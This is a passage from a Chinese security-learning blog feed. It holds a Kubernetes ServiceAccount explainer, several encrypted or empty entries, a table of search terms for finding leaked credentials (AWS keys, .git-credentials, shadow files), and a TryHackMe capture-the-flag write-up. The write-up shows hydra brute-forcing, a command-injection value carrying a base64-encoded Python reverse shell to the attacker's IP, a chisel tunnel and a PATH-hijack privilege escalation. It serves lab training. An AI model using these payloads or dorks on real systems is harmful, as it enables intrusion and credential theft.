Kubernetes 中，此身份在安全上下文中用于将身份与特定进程相关联。换句话说，集群内部和外部的 Kubernetes 系统组件、应用程序 Pod 或其他实体都可以使用 ServiceAccount 凭证来标识此 ServiceAccount。从安全角度来看，这意味着可以进行 API 身份验证，或者如前所述，可以使用这些 ServiceAccount 实现身份 &#x2F; 访问控制。</p><p>ServiceAccounts 与用户 </p><p>这里是一个很好的观点，可以强调 ServiceAccount 的 “非人类账户” 方面，并消除关于人类用户被身份验证 &#x2F; 授权进入集群的任何混淆。以下是有关 ServiceAccounts 和 Users 的一些信息。</p><table><thead><tr><th><strong>服务账户</strong></th><th><strong>用户</strong></th></tr></thead><tbody><tr><td>由 K8s 管理</td><td>在 K8s 之外管理</td></tr><tr><td>由 API 创建</td><td>没有 “User” Kubernetes Object</td></tr><tr><td>具有存储为 Secrets 的关联凭证</td><td>无法通过 API 创建</td></tr></tbody></table><p>从本质上讲，用户访问通常使用某种帐户管理解决方案来处理。Kubernetes 确实有一个内置的，但它通常与另一个用户管理系统（如 LDAP 或 AD）集成。对集群及其资源的非人工访问使用 Kubernetes ServiceAccounts 处理。</p><p><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1715701923679" title="User and ServiceAccount" class="gallery-item"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1715701923679" alt="User and ServiceAccount"></a>  </p><p>ServiceAccounts 具有以下属性：</p><p><strong>轻量级：</strong>Kubernetes ServiceAccounts 允许您创建与 Kubernetes 集群中的特定任务&#x2F;进程关联的账户。这省去了使用用户账户运行流程带来的许多麻烦（使用与用户账户创建中涉及的数据库相关的特殊系统和业务逻辑），并且更容易根据最小权限原则定义更精细的、特定于任务的权限。</p><p><strong>命名空间：</strong>在 Kubernetes 中，ServiceAccounts 是一个命名空间资源，这意味着 ServiceAccount 名称只需要在它们关联的命名空间中是唯一的。每个命名空间在创建时都会获得一个与之关联的默认 ServiceAccount，该名称恰如其分地命名为 “default”。假设您没有在 pod&#x2F;deployment 定义中手动定义 ServiceAccount。在这种情况下，这个 “默认” ServiceAccount（在创建 Pod 的命名空间中）将被分配给它，并且 ServiceAccounts 凭证（令牌）将作为 secret 挂载到它上面。请注意，默认情况下，“默认”ServiceAccount 的权限很少，因此如果任务需要更多权限，则需要创建一个 ServiceAccount。</p><p><strong>便携式：</strong>由于 ServiceAccount 是轻量级的，并且只需要在命名空间级别是唯一的，因此它们可以捆绑在一起以供其他命名空间或项目使用，从而使其具有可移植性。</p><p>这些属性适用于多种用例。作为 DevSecOps 工程师，在处理这些问题时，您的 ServiceAccount 意识应该令人耳目一新。以下是一些示例：</p><ul><li><p>在 Pod 中运行的任务&#x2F;进程需要与 API 通信以检索机密或敏感信息。此处可以使用 ServiceAccount 来授予对此密钥的只读访问权限。  </p></li><li><p>您在 “example-namespace” 中运行了一个 Pod。其过程包括确保所有 Pod 都在 “other-namespace” 中运行。这里可以使用 ServiceAccount，并结合 RBAC（稍后会详细介绍），以确保此 Pod 有足够的权限在 “other-namespace” 中列出 Pod。  </p></li><li><p>ServiceAccounts 可用于对外部服务进行身份验证。例如，假设您有一个 CI&#x2F;CD 管道，并且此管道中的某个阶段涉及对 Kubernetes 集群的身份验证。</p></li></ul><p><strong>ServiceAccounts 的创建和配置</strong></p><p>使用 kubectl 定义 ServiceAccounts 非常容易。您可以使用以下命令在集群上创建 ServiceAccount。<br><strong>注意：</strong>serviceaccount 可以缩写为 sa</p><p>kubectl 创建服务帐户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thm@k8s:~$ kubectl create serviceaccount example-name --namespace example-namespace</span><br></pre></td></tr></table></figure><p>如果您希望此 ServiceAccount 与特定 Pod 相关联，则可以在 pod&#x2F;部署配置 YAML 中定义，如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: example-pod</span><br><span class="line">  Namespace: example-namespace</span><br><span class="line">spec:</span><br><span class="line">  serviceAccountName: example-sa</span><br><span class="line">  containers:</span><br><span class="line">  - name: example-container</span><br><span class="line">    image: nginx:latest</span><br><span class="line">    ports:</span><br><span class="line">    - containerPort: 80</span><br></pre></td></tr></table></figure><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h2 id="攻击向量"><a href="#攻击向量" class="headerlink" title="攻击向量"></a>攻击向量</h2><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h2 id="知识点回顾"><a href="#知识点回顾" class="headerlink" title="知识点回顾"></a>知识点回顾</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>enterprise</title>
      <link href="/2024/11/28/enterprise/"/>
      <url>/2024/11/28/enterprise/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误😶‍🌫️" data-whm="文章部分缺失😯">  <script id="hbeData" type="hbeData" data-hmacdigest="8248e1475e513fe37ecc482a223c83088a964ec11c6715a19753b1a69439447c">7e8ec9cd4c38bd473ca2a20166522c3145fd1c8b18a1721263762d0215eb3f1a9e2f6583f81442cc48e4401935055f45e980a558d96e301c1d2cf7e701baaff41d92c08432e7b27405813252b7fa63f42d6601b18680ec8cb8c3cdde5eeac9cc1fab36494d3e026ad10b3dbf2435f3a644f0d10579b32e61ac09e2b0bbf3e8b9c3415bec1ef5e0d7b76ec542d8f30fa55b95ab194bbf2fad607064f7a5529ae6fd6e06a86504be6e6d2e7782191f2596cfa05d5c23a0f4608234a2ac5d4a269982f835407719b76a076bdb08aa9b76ab948607a5fdba5e7da14f5e975ecd50101a9e2712642a5f3784eea922c129e7eee76e8ac4153bf703eec04af192241d2e173f016287ccc108a288bf6e06756864b086b904b960a3b718f3b88b132af5cd55d08423b0bf332917388e0a809701bcd7c42a6e882ce407da57e0ce2ba0f646d3dc7a9daf3c1e4a2f54aab0c64bbd51c09531cb4025be560a4665ce4b0a28fc48c836629c58c49fd8682009d101c5709506ba118c89c6f81bc275b308dd7906a8b35678702aa5c8426c6de9e1dbba14c29bc9797e410b4637cbc5acd89741d6d957d0a2f486a41c48c11fd148a808273c3a3d7e2787fd72ea345edc56961fe5b02b4d7c0f0ccfb035d56999ddb0525c85a5acb94650561b5c61757b11c9f87c255ff31c839319fc75c0775eb811337053fe602abae1a96303326d6c1d0e833c8dbf447e0a1b34337b1a07d04546d3cb6b051637277d4d2b7ade822195e1b0e8236ee792430351e20e94a0e76cb61cc380c4094506e320fb6d7596f8c03ffc1e9abda381727646f5037bfdaa2a38cd1152b02d1a79ac07fadf1c1c695554d7e62e0e580633d7f1fbd582e353113d296fd4d9a6a8540a23216c5ae43064020b8a2ecddc4ec344d6def8551db8aedada21df24eaf0f8d8ed08ca6ce9196b408cc9b87176f8196cd0f72589dc633e8e10b42a6be2513a3fb6ac0e31caf95ac5a196a00c28d9104ecbbc026b0a6e0d1d94262d51258a8f41f1c102a9be8d689bb8ebddb76cbb8f028b1886f2a4756c1b21af9c8353a15e4ebf3ac5800d10e871a1ff6455e353b5fbb452d05832621508fbd0c74a77aec544449b36de527a4e704d18641fcec74263d62c7a3e805415d7b1ed9560c7e3be09e2f0f4a552de5a7210c38330e6cd17eab6aaa7381153c1e9604a8eb58cf056cdd9e945cc238721c5e6e89048e7d89ea7a9b243da896d9f503635fcfd30a188ee2a4c917ee06f9b658f5abb5a175c532ea9f7416433d8c9679d7f2699efa6c4cb5f9c5ddcb13eb3876077a5ddd384639679f780587c67d099be368dff116f19060069cf98ccdac45be14c6b18bfdc3ee80957d86b34ebefec5f4d874b3a5ec64afcf9adcdc2143a5a390bac60f1aa9326592ae8e9a9b01641bd7ebb8daec6b541d4f718b151f00395ee9d6c2d228671cc18b2d5186ecf16f876a6d54bf47a4ee805c64e2256f225326ded11e2d301358f2390ab3741dd20b7157ee97ac1b523e093b7a9e4eb4cdb6d56477b26bb3c2d15d8f18278ded3aa49df3d48823c939bb49f2553fa0eb9714a13487a2e486183196fbb7e5de698372ce4630bf9d3a008ad00fc10918d8b55f093ed92e0a89db86c9a541a3d4d2acf73cf4db4b9db614bb7e9756b87ca1e8187c265aaeca870fe01c87bd856ce412fa920292e2ae906204a97b7e00ffaf5bc9d14c3e6d5b854f3f0cdc3ada600fad3dff62d2088d46c68d7282a4497ed6e4048127a928f9b8782883583055b11e331731ec8571dc4c4146e5021f6447c63bce586d31edc00614b1532174f8f1a0ea183a0e3bc7fa64f94240ef9f814a1e2bf6b85c97d47e6f27fad9635b93d672728b09654ae9478265826abdd08e61a4b39b1f62198c7e1500d12154fea34815be822450d9e247145761898a83425e055e698615b235efd1690f42f3cb9203f11295d298bb88b619dc726fd94dfb4310cd8099d7ddbee4c3a7773fe0ccaba4f98d922c8b94c2de134b8282308b5cb7769a534ad71c4a14b75c16f01b3386551bc2ef3236e0f028a26b289891095f8dee442e465c70567b21938ee2cc550f8089071c6c6d9a0601895132a8515b3ff14cc65db0cad473efb2b19ff9e4d87c6ed07914a6b3b166a23f2b0e1fe3c583ace7f325c9f6ef1580a5cbf230ed57d84c54e176c05e6f3c029e0b229c45769fd2e898df6ee39ff21790724ebce373bb01eb30b23aa07dbcc1334cf0dcc2ccdf9907338bd23e26d838c045cb12143843a3e00206102f3108723814594b31533497acffb8cb2dda3496d8cfe37253ef9155a5bd48de05f99375bc72830405bbc46c0814e090e53f5dbb082a19cf59b3bd37fc427463a2bdc2f3a9b3441e7249f339c65215a6d2585b18423fe0519c923b5a47e092bde932e10129678b81486917363eb6911abc5</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时还看不了哦🔑</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流量分析-数字取证</title>
      <link href="/2024/11/27/FTPLoginEnumerationAttackAnalysis/"/>
      <url>/2024/11/27/FTPLoginEnumerationAttackAnalysis/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误😶‍🌫️" data-whm="文章部分缺失😯">  <script id="hbeData" type="hbeData" data-hmacdigest="a7bb71e1550f9e5f20688771c637fff3a7747eed9b5f6cfdb55335c15d74cf3c"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时还看不了哦🔑</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 报告 </tag>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流量分析-数字取证</title>
      <link href="/2024/11/27/Network-packet-captures/"/>
      <url>/2024/11/27/Network-packet-captures/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误😶‍🌫️" data-whm="文章部分缺失😯">  <script id="hbeData" type="hbeData" data-hmacdigest="ac4075eae28d644b470eee7dadfec51cbdea319eeab6e54d55e1a3a81bf5c89d"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时还看不了哦🔑</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 报告 </tag>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 服务器取证</title>
      <link href="/2024/11/27/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81/"/>
      <url>/2024/11/27/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote><p>通过分析受损的服务器，了解在 Linux 服务器上发现的数字取证伪影</p></blockquote><p>您受雇调查 ACME 网页设计的数据泄露事件。使用以下凭证通过 SSH 登录到目标计算机：</p><table><thead><tr><th>目标机器</th><th>本地机器</th></tr></thead><tbody><tr><td>10.10.19.215</td><td>10.17.5.121</td></tr></tbody></table><p>发现 后面</p><p><a href="/../assets/img/Pasted%20image%2020241127172907.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241127172907.png"></a></p><p><a href="/../assets/img/Pasted%20image%2020241127173017.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241127173017.png"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> #数字取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>敏感信息泄露</title>
      <link href="/2024/11/26/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
      <url>/2024/11/26/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><table><thead><tr><th><strong>Search Term</strong></th><th><strong>Search Term</strong></th><th><strong>Search Term</strong></th><th><strong>Search Term</strong></th></tr></thead><tbody><tr><td><code>AWSSecretKey</code></td><td><code>dbpassword</code></td><td><code>pwd</code></td><td><code>filename:WebServers.xml</code></td></tr><tr><td><code>JEKYLL_GITHUB_TOKEN</code></td><td><code>dbuser</code></td><td><code>pwds</code></td><td><code>filename:idea14.key</code></td></tr><tr><td><code>SF_USERNAME salesforce</code></td><td><code>dot-files</code></td><td><code>rds.amazonaws.com password</code></td><td><code>filename:.netrc password</code></td></tr><tr><td><code>access_key</code></td><td><code>dotfiles</code></td><td><code>redis_password</code></td><td><code>filename:known_hosts</code></td></tr><tr><td><code>access_token</code></td><td><code>encryption_key</code></td><td><code>root_password</code></td><td><code>filename:logins.json</code></td></tr><tr><td><code>amazons3</code></td><td><code>FabricApiSecret</code></td><td><code>apiSecret</code></td><td><code>filename:makefile</code></td></tr><tr><td><code>api_key</code></td><td><code>fb_secret</code></td><td><code>secret_password</code></td><td><code>filename:bash_history</code></td></tr><tr><td><code>api_secret</code></td><td><code>firebase</code></td><td><code>secret_access_key</code></td><td><code>filename:bash_profile</code></td></tr><tr><td><code>apidos</code></td><td><code>ftp</code></td><td><code>secret_key</code></td><td><code>filename:bashrc</code></td></tr><tr><td><code>apikey</code></td><td><code>github_key</code></td><td><code>secret_token</code></td><td><code>filename:bashrc password</code></td></tr><tr><td><code>app_secret</code></td><td><code>github_token</code></td><td><code>sets</code></td><td><code>filename:bashrc mailchimp</code></td></tr><tr><td><code>appkey</code></td><td><code>gitlab</code></td><td><code>security_credentials</code></td><td><code>filename:config</code></td></tr><tr><td><code>appsecret</code></td><td><code>gmail_password</code></td><td><code>send_keys</code></td><td><code>filename:config.json</code></td></tr><tr><td><code>application_key</code></td><td><code>gmail_username</code></td><td><code>send_keys</code></td><td><code>filename:connections.xml</code></td></tr><tr><td><code>appsecret</code></td><td><code>api.googlemaps AIZa</code></td><td><code>herokuapp</code></td><td><code>filename:credentials aws_access_key_id</code></td></tr><tr><td><code>auth</code></td><td><code>irc_pass</code></td><td><code>key</code></td><td><code>filename:.bash_history</code></td></tr><tr><td><code>auth_token</code></td><td><code>KeyPassword</code></td><td><code>ssh</code></td><td><code>filename:.bash_profile aws</code></td></tr><tr><td><code>authorizationToken</code></td><td><code>ldap_password</code></td><td><code>ssh2_auth_password</code></td><td><code>filename:.bashrc password</code></td></tr><tr><td><code>aws_access</code></td><td><code>ldap_username</code></td><td><code>login</code></td><td><code>filename:.cshrc</code></td></tr><tr><td><code>aws_access_key_id</code></td><td><code>mailchimp</code></td><td><code>storepass</code></td><td><code>filename:.docker/config auth</code></td></tr><tr><td><code>aws_secret</code></td><td><code>mydotfiles</code></td><td><code>mysql</code></td><td><code>filename:.env</code></td></tr><tr><td><code>aws_token</code></td><td><code>master_key</code></td><td><code>private_key</code></td><td><code>filename:.env MAIL_HOST=smtp.gmail.com</code></td></tr><tr><td><code>bashrc_password</code></td><td><code>node_env</code></td><td><code>pass</code></td><td><code>filename:.git-credentials</code></td></tr><tr><td><code>bucket_secrets</code></td><td><code>npmrc_auth</code></td><td><code>oauth_token</code></td><td><code>filename:.netrc</code></td></tr><tr><td><code>client_secret</code></td><td><code>pt_token</code></td><td><code>secret_api</code></td><td><code>filename:server.cfg</code></td></tr><tr><td><code>config</code></td><td><code>send_keys</code></td><td><code>ssh</code></td><td><code>filename:settings.py SECRET_KEY</code></td></tr><tr><td><code>consumer_key</code></td><td><code>passwords</code></td><td><code>storepass</code></td><td><code>filename:prod_secret.exs</code></td></tr><tr><td><code>credentials</code></td><td><code>heroku_api_key</code></td><td><code>preprod</code></td><td><code>filename:wp-config.php</code></td></tr><tr><td><code>database_password</code></td><td><code>homebrew_api_key</code></td><td><code>filename:prod_secret.exs NOT prod_secret.exs</code></td><td><code>filename:express.conf</code></td></tr><tr><td><code>private_key</code></td><td><code>config.php dbpassword</code></td><td><code>connections</code></td><td><code>filename:deploy.rake</code></td></tr><tr><td><code>filename:.bash_history</code></td><td><code>ftpconfig</code></td><td><code>shadow path:etc</code></td><td><code>filename:settings</code></td></tr><tr><td><code>filename:connections.xml</code></td><td><code>filename:recents.xml</code></td><td><code>sql</code></td><td><code>filename:proftpdpasswd</code></td></tr><tr><td><code>filename:docker.cfg</code></td><td><code>auth_token</code></td><td><code>filename:.travis</code></td><td><code>filename:config.json auths</code></td></tr><tr><td><code>filename:.npmrc_auth</code></td><td><code>remote-sync.json</code></td><td><code>filename:shadow</code></td><td><code>filename:sftp.json path:.vscode</code></td></tr><tr><td><code>filename:constants</code></td><td><code>filename:secrets.yml</code></td><td><code>rcon password</code></td><td><code>filename:.git-credentials</code></td></tr></tbody></table><hr></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>thm-otf</title>
      <link href="/2024/11/25/yotf/"/>
      <url>/2024/11/25/yotf/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote></blockquote><h2 id="靶场概述"><a href="#靶场概述" class="headerlink" title="靶场概述"></a>靶场概述</h2><p>难度： hard<br>描述：千万别小看狡猾的老狐狸……<br>你能躲过狡猾的狐狸吗？</p><hr><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>🚀</th><th>本地机器信息</th><th>目标机器信息</th></tr></thead><tbody><tr><td>IP</td><td>10.17.5.121</td><td>10.10.206.5</td></tr><tr><td>OS</td><td>kali</td><td>Linux</td></tr></tbody></table><hr><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>端口扫描<br><a href="/../assets/img/Pasted%20image%2020241126000314.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126000314.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT    STATE SERVICE      REASON</span><br><span class="line">80/tcp  open  http         syn-ack</span><br><span class="line">139/tcp open  netbios-ssn  syn-ack</span><br><span class="line">445/tcp open  microsoft-ds syn-ack</span><br></pre></td></tr></table></figure><ol><li><p><strong>80&#x2F;tcp (HTTP)</strong>:</p><ul><li><strong>Web服务漏洞</strong>：端口80通常用于HTTP服务，如果该端口上有Web服务运行，可能存在Web应用漏洞（如SQL注入、跨站脚本攻击XSS、文件上传漏洞等）。</li><li><strong>远程代码执行</strong>：Web服务如果存在漏洞（如未修补的CMS、脆弱的Web框架等），攻击者可能利用漏洞实现远程代码执行。</li><li><strong>信息泄露</strong>：HTTP服务也可能泄露服务器的敏感信息，如错误信息、配置文件、数据库信息等，提供攻击者进一步入侵的线索。</li></ul></li><li><p><strong>139&#x2F;tcp (NetBIOS-SSN)</strong>:</p><ul><li><strong>NetBIOS&#x2F;SMB漏洞</strong>：端口139是与Windows网络共享和文件共享相关的NetBIOS服务。攻击者可以通过这个端口利用诸如<strong>EternalBlue</strong>等漏洞攻击Windows机器，进行远程代码执行。</li><li><strong>SMB协议漏洞</strong>：如果服务器使用较旧的SMB协议（如SMBv1），攻击者可能利用SMB协议中的已知漏洞（如<strong>MS17-010</strong>）来发起攻击。</li></ul></li><li><p><strong>445&#x2F;tcp (Microsoft-DS)</strong>:</p><ul><li><strong>SMB远程代码执行漏洞</strong>：端口445用于Microsoft的SMB协议，是攻击者常用的目标。如果存在未修补的漏洞，尤其是<strong>EternalBlue</strong>等著名漏洞，攻击者可以利用这个漏洞进行远程代码执行。</li><li><strong>暴力破解和身份验证绕过</strong>：如果SMB服务没有正确配置，攻击者可能通过暴力破解或枚举用户</li></ul></li></ol><p><a href="/../assets/img/Pasted%20image%2020241126000730.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126000730.png"></a></p><p>配置hosts</p><p><a href="/../assets/img/Pasted%20image%2020241126001226.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126001226.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux 10.10.206.5 -U</span><br></pre></td></tr></table></figure><p>获取到了<br><a href="/../assets/img/Pasted%20image%2020241126003656.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126003656.png"></a><br>fox和rascal</p><p>80端口需要配置<br><a href="/../assets/img/Pasted%20image%2020241126000430.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126000430.png"></a></p><h2 id="攻击向量"><a href="#攻击向量" class="headerlink" title="攻击向量"></a>攻击向量</h2><p>可以尝试进行密码爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user -P /usr/share/wordlists/rockyou.txt 10.10.206.5 http-get</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rascal</span><br></pre></td></tr></table></figure><p><a href="/../assets/img/Pasted%20image%2020241126005148.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126005148.png"></a></p><p><a href="/../assets/img/Pasted%20image%2020241126010109.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126010109.png"></a></p><ol><li><p><code>\&quot;;/usr/bin/id\n </code> 这个</p><p> 这个字符串 <code>\&quot;;/usr/bin/id\n</code> 看起来像是一个试图在命令行中执行命令注入的payload。</p><ol><li><p>**<code>\&quot;</code>**：</p><ul><li>这个字符是转义的双引号 (<code>\&quot;</code>)，它的作用是结束当前的字符串或命令参数。这通常用来突破命令的语法结构，并可能结束一个命令或字符串参数，使攻击者能够插入自己的命令。</li></ul></li><li><p>**<code>;</code>**：</p><ul><li>这是命令分隔符。在Unix和Linux系统中，<code>；</code>（分号）用于分隔不同的命令。在命令注入中，攻击者可以通过插入分号来结束当前的命令并开始执行新的命令。</li></ul></li><li><p>**<code>/usr/bin/id</code>**：</p><ul><li>这是Linux&#x2F;Unix系统中的一个命令，<code>id</code> 命令用于显示当前用户的身份信息，包括用户ID（UID）、组ID（GID）等。</li><li>攻击者可能希望通过注入此命令来查看当前用户的权限或获取敏感信息。</li></ul></li><li><p>**<code>\n</code>**：</p><ul><li>这是换行符，通常表示命令结束并换到新的一行，通常在多行命令中用来表示结束。</li></ul></li></ol></li></ol><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;target&quot;:&quot;\&quot;;echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTcuNS4xMjEiLDQ0NDMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJzaCIpJw==|base64 -d|bash\n&quot;&#125;</span><br></pre></td></tr></table></figure><p><a href="/../assets/img/Pasted%20image%2020241126011326.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126011326.png"></a></p><p><a href="/../assets/img/Pasted%20image%2020241126011416.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126011416.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel server -p 8081 --reverse</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@year-of-the-fox:/tmp$ ./ch client 10.17.5.121:8081 R:10.17.5.121:2222:localhost:22</span><br></pre></td></tr></table></figure><p><a href="/../assets/img/Pasted%20image%2020241126013254.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126013254.png"></a></p><p><a href="/../assets/img/Pasted%20image%2020241126013559.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126013559.png"></a><br><a href="/../assets/img/Pasted%20image%2020241126013748.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126013748.png"></a></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fox@year-of-the-fox:~$ sudo -l</span><br><span class="line">Matching Defaults entries for fox on year-of-the-fox:</span><br><span class="line">    env_reset, mail_badpass</span><br><span class="line"></span><br><span class="line">User fox may run the following commands on year-of-the-fox:</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/shutdown</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在目标机器上开启http服务，下载shutdown,发现他调用了poweroff,且没有使用绝对路径</p><p><a href="/../assets/img/Pasted%20image%2020241126014336.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126014336.png"></a><br><a href="/../assets/img/Pasted%20image%2020241126014324.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126014324.png"></a><br><a href="/../assets/img/Pasted%20image%2020241126014426.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241126014426.png"></a></p><h2 id="知识点回顾"><a href="#知识点回顾" class="headerlink" title="知识点回顾"></a>知识点回顾</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> THM </tag>
            
        </tags>
      
    </entry>
    
